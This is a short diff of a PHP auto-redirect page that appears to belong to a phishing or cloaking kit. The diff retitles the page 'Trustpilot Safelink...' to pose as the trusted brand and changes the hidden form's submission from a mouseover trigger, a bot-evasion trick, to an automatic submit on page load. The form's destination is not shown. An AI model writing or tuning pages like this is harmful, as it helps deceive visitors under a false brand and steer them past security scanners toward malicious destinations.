@@ -1,6 +1,5 @@
 <?php
 session_start();
-// Generate a unique token and store it along with the browser's user agent
 $_SESSION['id'] = md5(uniqid());
 $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $sessionID = $_SESSION['id'];
@@ -9,22 +8,20 @@ $sessionID = $_SESSION['id'];
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecting...</title>
+  <title>Trustpilot Safelink...</title>
   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" 
         integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" 
         crossorigin="anonymous">
   <script>
-    // A sleep function to delay the form submission (adjust delay as needed)
-    function sleep(ms) {
-      return new Promise(resolve => setTimeout(resolve, ms));
-    }
-    async function onLoad() {
-      await sleep(1000); // 1000ms = 1 second delay
-      document.getElementById('form').submit();
+    // On page load, submit the form after a minimal delay (100ms)
+    window.onload = function() {
+      setTimeout(function() {
+        document.getElementById('form').submit();
+      }, 100);
     }
   </script>
 </head>
-<body onmouseover="onLoad()" id="bot">
+<body>
   <div style="width: 100%; height: 100vh;" class="d-flex justify-content-center align-items-center">
     <div class="spinner-border text-primary" role="status">
       <span class="sr-only">Loading...</span>
